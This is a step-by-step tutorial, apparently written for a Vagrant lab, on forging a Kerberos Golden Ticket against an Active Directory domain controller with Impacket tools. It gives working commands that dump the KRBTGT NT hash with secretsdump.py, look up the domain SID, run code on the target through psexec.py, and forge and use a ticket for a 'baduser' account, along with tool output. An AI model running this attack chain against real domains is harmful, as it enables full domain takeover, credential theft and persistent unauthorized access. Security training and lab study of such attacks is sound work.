---
author:
- David Johnson
index: 'Windows!Servers!Golden Ticket'
setupfile: '\"../org-html-themes/org/theme-readtheorg-local-1.setup\"'
title: Golden Ticket with Impacket
---

Golden Ticket
=============

This document covers how to create a Golden Ticket. An Active Directory
Domain server is required for this to work. Connected clients are useful
but not required.

Creating the Ticket
===================

To create a Golden Ticket the NT Hash for KRBTGT will need to be aquired
as well as the Domain SID. All this can easily be done with Impacket.

KRBTGT NT Hash
==============

Lets start off by getting the KRBTGT hash. The following script will
write our desired information to a file called win2016 in the \~/
directory.

``` {.example}
secretsdump.py Administrator:vagrant@192.168.64.133 | grep krbtgt | grep ::: > ~/win2016; cat ~/win2016
```

Domain SID
==========

To get the domain SID use lookupsid.py and grep to filter out just the
information needed. Again that information is writen to the win2016
file.

``` {.example}
lookupsid.py Administrator:vagrant@192.168.64.133 | grep "Domain SID" >> ~/win2016; cat ~/win2016
```

Domain Name
===========

There are times when we forget which domain we are on. To limit errors
we will not assume the domain name but rather get it from the machine.

``` {.example}
echo "powershell Get-WmiObject Win32_ComputerSystem" > ~/GetDomain.bat
```

Now execute this bat file on the target.

``` {.example}
psexec.py Administrator:vagrant@192.168.64.133 -c ~/GetDomain.bat | grep Domain >> ~/win2016; cat ~/win2016
```

Create Ticket
=============

With all the nessassary data create a ticket.

``` {.example}
ticketer.py -nthash 4031b5ae4b9defa1f411f26610493e0c -domain-sid S-1-5-21-126282473-2140987555-3925513934 -domain Win2016.local baduser
```

``` {.example}
Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for Win2016.local/baduser
[*]         PAC_LOGON_INFO
[*]         PAC_CLIENT_INFO_TYPE
[*]         EncTicketPart
[*]         EncAsRepPart
[*] Signing/Encrypting final ticket
[*]         PAC_SERVER_CHECKSUM
[*]         PAC_PRIVSVR_CHECKSUM
[*]         EncTicketPart
[*]         EncASRepPart
[*] Saving ticket in baduser.ccache

```

Use the Ticket
==============

To use the ticket with psexec.py the ticket needs to be exported.

Export the Ticket
-----------------

The ticket will need to be exported to be able to use it with psexec.py.

``` {.example}
echo "export KRB5CCNAME=/vagrant/docs/baduser.ccache" >> ~/.bashrc
. ~/.bashrc
tail ~/.bashrc
```

Use the Ticket With Psexec
--------------------------

Below we use the ticket against Win2016.

``` {.example}
export KRB5CCNAME=/vagrant/docs/baduser.ccache; psexec.py -dc-ip 192.168.64.133 -target-ip 192.168.64.133 -no-pass -k Win2016.local/baduser@Win2016.Win2016.local
```
